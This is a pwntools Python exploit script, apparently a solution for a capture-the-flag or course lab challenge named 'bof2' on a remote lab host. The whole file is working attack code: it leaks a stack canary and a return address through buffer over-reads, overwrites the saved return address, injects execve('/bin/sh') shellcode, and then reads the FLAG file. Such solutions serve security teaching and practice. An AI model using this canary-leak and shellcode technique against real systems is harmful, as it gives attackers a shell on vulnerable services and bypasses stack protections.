#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof2'
port = 10259

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

codes = """
  xor rax, rax
  push rax
  mov rbx, 0x68732f6e69622f2f
  push rbx
  mov rdi, rsp
  mov rsi, 0
  mov rdx, 0
  mov rax, 59
  syscall
"""

payload = asm(codes)

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

pause()

r.recvuntil(b'name?')
r.send(b'A'*41)
r.recvuntil(b'A'*41)
canary = r.recv(7).rjust(8,b'\x00')

r.recvuntil(b'number? ')
r.send(b'A'*56)
r.recvuntil(b'A'*56)
ret = r.recv(6).ljust(8,b'\x00')
nret = p64(u64(ret)+0xca6d9)

exploit = b'A'*40 + canary + b'A'*8 + nret
r.recvuntil(b'name?')
r.send(exploit)

r.recvuntil(b'message: ')
r.sendline(payload)
r.send(b'cat FLAG\n')
r.recvline()
print(r.recvline())

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :